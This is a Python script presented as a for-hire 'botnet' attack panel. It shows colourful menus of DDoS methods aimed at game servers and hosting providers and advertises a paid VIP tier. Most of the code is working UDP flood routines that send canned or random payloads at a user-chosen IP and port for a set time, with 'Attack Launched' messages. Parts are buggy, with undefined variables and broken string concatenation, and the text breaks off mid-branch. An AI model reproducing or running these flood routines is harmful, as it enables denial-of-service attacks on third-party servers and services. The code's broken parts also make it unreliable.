#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

print("Please Type Your User And Password No account yet? please dm Xalx#0011")
User = "root"
Password = "root"
print("Successfully Login✓")

methods = """
\033[00;1;95m                     \033[00;1;95m ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
\033[00;1;95m                     \033[00;1;95m▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m
\033[00;1;95m                    \033[00;1;95m ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m
\033[00;1;95m                     \033[00;1;95m▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m
\033[00;1;95m                    \033[00;1;96m.\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m

\033[37m                     ═════════════╦═════\033[33m════════╦════════════
\033[37m                     ╔═══════════════╗ ╔═══════════╩═══╗ {YELLOW} ╔══════╩════════╗ ╔═══════════════╗
\033[37m                      SSDP          ╠═╣ ARD           ╠═\033[33m═╣ NTP           ╠═╣ UDP-MINI      ║
\033[37m                     ║ SNMP          ╠═╣ CLDAP         ╠═\033[33m═╣ HOME-CLAP     ╠═╣ STD           ║
\033[37m                     ╚═══════════════╝ ╚════╦════╦═════╝ {YELLOW} ╚═════╦════╦════╝ ╚═══════════════╝
\033[37m                     ╔══════════════╩╗  ╔╩═══════\033[33m═══════╩╗  ╔╩══════════════╗
\033[37m                     ║ TCP-SBNAFU    ╠══╣ PORT-KI\033[33mLL      ╠══╣ ROBLOX        ║
\033[37m                     ╔╣ PRODIGY-WRA   ╠══╣ FORTNIT\033[33mE       ╠══╣ FIVEM         ╠╗
\033[37m                     ╔╝╚═══════════════╝  ╚════════\033[33m════════╝  ╚═══════════════╝╚╗
\033[37m                     ╚════════════════════╦════════\033[33m════════╦════════════════════╝
\033[37m                     ═════════╦═════════════════╦╩════════\033[33m════════╩╦═════════════════╦═════════
\033[37m                     ╔═══════╩═══════╗ ╔═══════╩═══════╗ \033[33m ╔═══════╩═══════╗ ╔═══════╩═══════╗
\033[37m                     ║ NFO-ULTIMATE  ╠═╣ 100UP         ╠═{YELLOW}═╣ OVH-STRONG    ╠═╣ HTTP-BYPASS   ║
\033[37m                     ║ OVH-TCP       ║ ║ OVH-V2        ║ {YELLOW} ║ OVH-AMP       ║ ║ HTTP-GET      ║
\033[37m                     ║ HYDRA         ╠═╣ OVH-DOWN      ╠═{YELLOW}═╣ SYN           ╠═╣ HTTP-RAND     ║
\033[37m                     ╚═══════════════╝ ╚═══════════════╝ \033[33m ╚═══════════════╝ ╚═══════════════╝
"""

raw = """
\033[00;1;95m                     \033[00;1;95m ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
\033[00;1;95m                     \033[00;1;95m▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m
\033[00;1;95m                    \033[00;1;95m ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m
\033[00;1;95m                     \033[00;1;95m▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m
\033[00;1;95m                    \033[00;1;96m.\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m

\033[36m            ╔══════════════════════════╦════════════════════════════╗
\033[36m            ║ \033[37mudpraw \033[34m- \033[37mRaw UDP Flood \033[36m  ║ \033[37mhexraw \033[34m- \033[37mRaw HEX Flood \033[36m    ║
\033[36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[36m             ║ \033[37mtcpraw \033[34m- \033[37mRaw TCP Flood \033[36m║ ║ \033[37mvseraw \033[34m- \033[37mRaw VSE Flood \033[36m  ║
\033[36m             ║ \033[37mstdraw \033[34m- \033[37mRaw STD Flood \033[36m║ ║ \033[37mqmsynraw \033[34m- \033[37mRaw SYN Flood \033[36m║
\033[36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[36m            ║    \033[37mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \033[36m║
\033[36m            ╚═══════════════════════════════════════════════════════╝
"""
vip = """
[38;2;255;0;255mV[38;2;234;21;255mI[38;2;213;42;255mP[38;2;192;63;255m [38;2;171;84;255mM[38;2;150;105;255me[38;2;129;126;255mt[38;2;108;147;255mh[38;2;87;168;255mo[38;2;66;189;255md[38;2;45;210;255ms [1;37m● [1;34mStatus [1;34m[[1;32mONLINE[1;34m] [1;37m● [38;2;255;0;255mV[38;2;237;18;255mI[38;2;219;36;255mP[38;2;201;54;255m [38;2;183;72;255mP[38;2;165;90;255me[38;2;147;108;255mr[38;2;129;126;255mm[38;2;111;144;255mi[38;2;93;162;255ms[38;2;75;180;255ms[38;2;57;198;255mi[38;2;39;216;255mo[38;2;21;234;255mn [1;34m[<<$vip>>[1;34m]

                                [38;2;255;0;255m╔[38;2;237;18;255m═[38;2;219;36;255m╗[38;2;201;54;255m╔[38;2;183;72;255m═[38;2;165;90;255m╗[38;2;147;108;255m╦[38;2;129;126;255m═[38;2;111;144;255m╗[38;2;93;162;255m╦[38;2;75;180;255m╔[38;2;57;198;255m═[38;2;39;216;255m╗[38;2;21;234;255m
                                [38;2;255;0;255m║[38;2;237;18;255m [38;2;219;36;255m [38;2;201;54;255m║[38;2;183;72;255m [38;2;165;90;255m║[38;2;147;108;255m╠[38;2;129;126;255m╦[38;2;111;144;255m╝[38;2;93;162;255m║[38;2;75;180;255m╠[38;2;57;198;255m═[38;2;39;216;255m╣[38;2;21;234;255m
                                [38;2;255;0;255m╚[38;2;237;18;255m═[38;2;219;36;255m╝[38;2;201;54;255m╚[38;2;183;72;255m═[38;2;165;90;255m╝[38;2;147;108;255m╩[38;2;129;126;255m╚[38;2;111;144;255m═[38;2;93;162;255m╩[38;2;75;180;255m╩[38;2;57;198;255m [38;2;39;216;255m╩[38;2;21;234;255m[1;36m𝓧[1;31m𝓥
                           [38;2;255;0;255m👑 [1;32m𝓞𝓫𝓼𝓮𝓼𝓼𝓮𝓭 𝓦𝓲𝓽𝓱 𝓨𝓸𝓾 [38;2;255;0;255m👑
         [38;2;255;0;255m [38;2;251;4;255m [38;2;247;8;255m═[38;2;243;12;255m═[38;2;239;16;255m═[38;2;235;20;255m═[38;2;231;24;255m═[38;2;227;28;255m═[38;2;223;32;255m═[38;2;219;36;255m═[38;2;215;40;255m═[38;2;211;44;255m═[38;2;207;48;255m═[38;2;203;52;255m═[38;2;199;56;255m═[38;2;195;60;255m═[38;2;191;64;255m═[38;2;187;68;255m═[38;2;183;72;255m═[38;2;179;76;255m═[38;2;175;80;255m═[38;2;171;84;255m═[38;2;167;88;255m═[38;2;163;92;255m═[38;2;159;96;255m═[38;2;155;100;255m═[38;2;151;104;255m═[38;2;147;108;255m═[38;2;143;112;255m═[38;2;139;116;255m═[38;2;135;120;255m╦[38;2;131;124;255m═[38;2;127;128;255m═[38;2;123;132;255m═[38;2;119;136;255m═[38;2;115;140;255m═[38;2;111;144;255m═[38;2;107;148;255m═[38;2;103;152;255m═[38;2;99;156;255m═[38;2;95;160;255m═[38;2;91;164;255m═[38;2;87;168;255m═[38;2;83;172;255m═[38;2;79;176;255m═[38;2;75;180;255m═[38;2;71;184;255m═[38;2;67;188;255m═[38;2;63;192;255m═[38;2;59;196;255m═[38;2;55;200;255m═[38;2;51;204;255m═[38;2;47;208;255m═[38;2;43;212;255m═[38;2;39;216;255m═[38;2;35;220;255m═[38;2;31;224;255m═[38;2;27;228;255m═[38;2;23;232;255m═[38;2;19;236;255m
           [38;2;255;0;255m👑 [1;32mmethod   [38;2;255;0;255m👑 [1;32mmethod  [38;2;255;0;255m👑   [38;2;135;120;255m║   [38;2;255;0;255m👑 [1;32mmethod   [38;2;255;0;255m👑 [1;32mmethod  [38;2;255;0;255m👑
           [38;2;255;0;255m👑 [1;32mmethod   [38;2;255;0;255m👑 [1;32mmethod  [38;2;255;0;255m👑   [38;2;135;120;255m║   [38;2;255;0;255m👑 [1;32mmethod   [38;2;255;0;255m👑 [1;32mmethod  [38;2;255;0;255m👑
           [38;2;255;0;255m👑 [1;32mmethod   [38;2;255;0;255m👑 [1;32mmethod  [38;2;255;0;255m👑   [38;2;135;120;255m║   [38;2;255;0;255m👑 [1;32mmethod   [38;2;255;0;255m👑 [1;32mmethod  [38;2;255;0;255m👑
           [38;2;255;0;255m👑 [1;32mmethod   [38;2;255;0;255m👑 [1;32mmethod  [38;2;255;0;255m👑   [38;2;135;120;255m║   [38;2;255;0;255m👑 [1;32mmethod   [38;2;255;0;255m👑 [1;32mmethod  [38;2;255;0;255m👑
         [38;2;255;0;255m╔[38;2;251;4;255m═[38;2;247;8;255m═[38;2;243;12;255m═[38;2;239;16;255m═[38;2;235;20;255m═[38;2;231;24;255m═[38;2;227;28;255m═[38;2;223;32;255m═[38;2;219;36;255m═[38;2;215;40;255m═[38;2;211;44;255m═[38;2;207;48;255m═[38;2;203;52;255m═[38;2;199;56;255m═[38;2;195;60;255m═[38;2;191;64;255m═[38;2;187;68;255m═[38;2;183;72;255m═[38;2;179;76;255m═[38;2;175;80;255m═[38;2;171;84;255m═[38;2;167;88;255m═[38;2;163;92;255m═[38;2;159;96;255m═[38;2;155;100;255m═[38;2;151;104;255m═[38;2;147;108;255m═[38;2;143;112;255m═[38;2;139;116;255m╦[38;2;135;120;255m╩[38;2;131;124;255m╦[38;2;127;128;255m═[38;2;123;132;255m═[38;2;119;136;255m═[38;2;115;140;255m═[38;2;111;144;255m═[38;2;107;148;255m═[38;2;103;152;255m═[38;2;99;156;255m═[38;2;95;160;255m═[38;2;91;164;255m═[38;2;87;168;255m═[38;2;83;172;255m═[38;2;79;176;255m═[38;2;75;180;255m═[38;2;71;184;255m═[38;2;67;188;255m═[38;2;63;192;255m═[38;2;59;196;255m═[38;2;55;200;255m═[38;2;51;204;255m═[38;2;47;208;255m═[38;2;43;212;255m═[38;2;39;216;255m═[38;2;35;220;255m═[38;2;31;224;255m═[38;2;27;228;255m═[38;2;23;232;255m═[38;2;19;236;255m═[38;2;15;240;255m╗[38;2;11;244;255m
         [38;2;255;0;255m║   [1;33mhttpnuke [1;31m[[1;32mURL[1;31m] [1;31m[[1;32mTIME[1;31m]    [38;2;139;116;255m║[38;2;135;120;255m [38;2;131;124;255m║  [1;33mhttpskillv2  [1;31m[[1;32mURL[1;31m] [1;31m[[1;32mTIME[1;31m] [38;2;15;240;255m║
         [38;2;255;0;255m║   [1;33mtorkill  [1;31m[[1;32mURL[1;31m] [1;31m[[1;32mTIME[1;31m]    [38;2;139;116;255m║[38;2;135;120;255m [38;2;131;124;255m║  [1;33mhttpdatabase [1;31m[[1;32mURL[1;31m] [1;31m[[1;32mTIME[1;31m] [38;2;15;240;255m║
         [38;2;255;0;255m║   [1;32mDont Spam on the [1;33mYellow [1;32mMethods and [1;31mmax 600 [1;32mwith them   [38;2;15;240;255m║
         [38;2;255;0;255m╚[38;2;251;4;255m═[38;2;247;8;255m═[38;2;243;12;255m═[38;2;239;16;255m═[38;2;235;20;255m═[38;2;231;24;255m═[38;2;227;28;255m═[38;2;223;32;255m═[38;2;219;36;255m═[38;2;215;40;255m═[38;2;211;44;255m═[38;2;207;48;255m═[38;2;203;52;255m═[38;2;199;56;255m═[38;2;195;60;255m═[38;2;191;64;255m═[38;2;187;68;255m═[38;2;183;72;255m═[38;2;179;76;255m═[38;2;175;80;255m═[38;2;171;84;255m═[38;2;167;88;255m═[38;2;163;92;255m═[38;2;159;96;255m═[38;2;155;100;255m═[38;2;151;104;255m═[38;2;147;108;255m═[38;2;143;112;255m═[38;2;139;116;255m═[38;2;135;120;255m═[38;2;131;124;255m═[38;2;127;128;255m═[38;2;123;132;255m═[38;2;119;136;255m═[38;2;115;140;255m═[38;2;111;144;255m═[38;2;107;148;255m═[38;2;103;152;255m═[38;2;99;156;255m═[38;2;95;160;255m═[38;2;91;164;255m═[38;2;87;168;255m═[38;2;83;172;255m═[38;2;79;176;255m═[38;2;75;180;255m═[38;2;71;184;255m═[38;2;67;188;255m═[38;2;63;192;255m═[38;2;59;196;255m═[38;2;55;200;255m═[38;2;51;204;255m═[38;2;47;208;255m═[38;2;43;212;255m═[38;2;39;216;255m═[38;2;35;220;255m═[38;2;31;224;255m═[38;2;27;228;255m═[38;2;23;232;255m═[38;2;19;236;255m═[38;2;15;240;255m╝[38;2;11;244;255m
             [1;32mOur V.I.P network has dedicated 350gig/s partitioned
            [1;32mfrom the total network. V.I.P addon costs $30 lifetime
       [38;2;255;0;255m╚[38;2;252;3;255m═[38;2;249;6;255m═[38;2;246;9;255m═[38;2;243;12;255m═[38;2;240;15;255m═[38;2;237;18;255m═[38;2;234;21;255m═[38;2;231;24;255m═[38;2;228;27;255m═[38;2;225;30;255m═[38;2;222;33;255m═[38;2;219;36;255m═[38;2;216;39;255m═[38;2;213;42;255m═[38;2;210;45;255m═[38;2;207;48;255m═[38;2;204;51;255m═[38;2;201;54;255m═[38;2;198;57;255m═[38;2;195;60;255m═[38;2;192;63;255m═[38;2;189;66;255m═[38;2;186;69;255m═[38;2;183;72;255m═[38;2;180;75;255m═[38;2;177;78;255m═[38;2;174;81;255m═[38;2;171;84;255m═[38;2;168;87;255m═[38;2;165;90;255m═[38;2;162;93;255m═[38;2;159;96;255m═[38;2;156;99;255m═[38;2;153;102;255m═[38;2;150;105;255m═[38;2;147;108;255m═[38;2;144;111;255m═[38;2;141;114;255m═[38;2;138;117;255m═[38;2;135;120;255m═[38;2;132;123;255m═[38;2;129;126;255m═[38;2;126;129;255m═[38;2;123;132;255m═[38;2;120;135;255m═[38;2;117;138;255m═[38;2;114;141;255m═[38;2;111;144;255m═[38;2;108;147;255m═[38;2;105;150;255m═[38;2;102;153;255m═[38;2;99;156;255m═[38;2;96;159;255m═[38;2;93;162;255m═[38;2;90;165;255m═[38;2;87;168;255m═[38;2;84;171;255m═[38;2;81;174;255m═[38;2;78;177;255m═[38;2;75;180;255m═[38;2;72;183;255m═[38;2;69;186;255m═[38;2;66;189;255m═[38;2;63;192;255m╝[0;00m


"""

help = """
\033[36m                                ░░▄█▀▄─▒▄█\033[31m▀▀█▒█▀█▀█░░▄█▀▄─
\033[36m                                ░▐█▄▄▐█▒▀▀\033[31m█▄▄░░▒█░░░▐█▄▄▐█
\033[36m                                ░▐█─░▐█▒█▄\033[31m▄█▀░▒▄█▄░░▐█─░▐█
\033[36m            
\033[36m            ╚═══╦═══════════════════════╦═══╝
\033[36m            ╔════╩═══════════════════════╩══════╗
\033[36m            ║  METHODS -> [Sh\033[31mow Methods Pages]  ║
\033[36m            ║  FUNC    -> [Sh\033[31mow All Functions]  ║
\033[36m            ║  TOOLS   -> [Sh\033[31mow All Net Tools]  ║
\033[36m            ║  STATUS  -> [Sh\033[31mow Net Status <3]  ║
\033[36m            ║  ACCOUNT -> [Sh\033[31mow Net Acc info ]  ║
\033[36m            ║  PASSWD  -> [Ch\033[31mange Acc Passwd ]  ║
\033[36m            ║  RULES   -> [S\033[31mow All Net Rules]  ║
\033[36m            ║  EXIT    -> [Ex\033[31mit The Terminal ]  ║
\033[36m            ╚═══════════════════════════════════╝
"""

banner = "\x1b[38;5;242m                         ╔════════════════════════════╗\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣿⣿⣿⣿⣿⣿⣿"+G+"⣿⣿⣿⣿⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣿⣿⣿⣿⣿⣿⣿"+G+"⣿⣿⣿⣿⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣿⣿⣿⣿⣿⣿⡿"+G+"⠟⠋⣱⣿⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣿⣿⣿⠿⢿⠏⣴"+G+"⢋⣼⣿⣿⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⡿⠋⠀⢠⢋⡾⢡"+G+"⣎⣀⠬⠛⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⠏"+D+"⠀⠀⡰⢡⡟⠁⢉"+G+"⡡⣴⢖⠞⠈⢻⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⡟⠀"+D+"⠀⡴⣱⠟⠳⣤⣟"+G+"⡾⢃⠎⢀⣤⠆⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⡇⠀"+D+"⣼⠤⠖⡾⣵⢯⡾"+G+"⢁⠾⡊⢡⠋⠀⣹"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣧⠀"+D+"⠀⢠⢎⣾⣫⠟⢦"+G+"⣠⡟⡡⠁⠀⠀⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣆"+D+"⡰⠣⠾⢑⣋⠄⣴"+G+"⠟⡰⠁⠀⠀⣼⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣶⣏⠉⢡⢊⣼⠋"+G+"⡜⠀⠀⣠⣾⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣿⣿⣷⢃⡾⢁⣾"+G+"⣴⣶⣿⣿⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣿⡿⢁⣠⣶⣿⣿"+G+"⣿⣿⣿⣿⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣿⣷⣿⣿⣿⣿⣿"+G+"⣿⣿⣿⣿⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m                         ║"+P+"⣿⣿⣿⣿⣿⣿⣿"+D+"⣿⣿⣿⣿⣿⣿⣿"+G+"⣿⣿⣿⣿⣿⣿⣿"+B+"⣿⣿⣿⣿⣿⣿⣿\x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m        ╔════════════════╩════════════════════════════╩═══════════════╗\r\n"+
"\x1b[38;5;242m        ║"+P+" █  █ █▀▀ █▀▀▄ ▀▀█▀▀ █▀▀█ ▀█▀ 　  █  █ █▀▀█ ▀█ █▀ █▀▀  █▄  █ \x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m        ║"+D+" █▀▀█ █▀▀ █  █   █   █▄▄█  █  　  █▀▀█ █▄▄█  █▄█  █▀▀  █ █ █ \x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m        ║"+G+" █  █ ▀▀▀ ▀  ▀   ▀   ▀  ▀ ▄█▄ 　  █  █ ▀  ▀   ▀   ▀▀▀  █  ▀█ \x1b[38;5;242m║\r\n"+
"\x1b[38;5;242m        ╚═════════════════════════════════════════════════════════════╝\r\n"

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def udpsender(host, port, timer, byte):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(byte, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(666,2109))
		sys.stdout.write("\x1b]2;ASTA  NET".format (bots))
		sin = input("\033[36m[\033[36mXalX\033[37m@Botnet\033[35m]\033[32m$ \033[36m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "privateX":
			os.system ("clear")
			print (layer4)
			main()
		elif sinput == "method":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("clear")
			print (private)
			main()
		elif sinput == "gen3":
			os.system ("clear")
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ("clear")
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "cldap":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mAttack Sent")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[37mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 666
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1021
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=stdsender, args=(host, timer, port, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 20000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
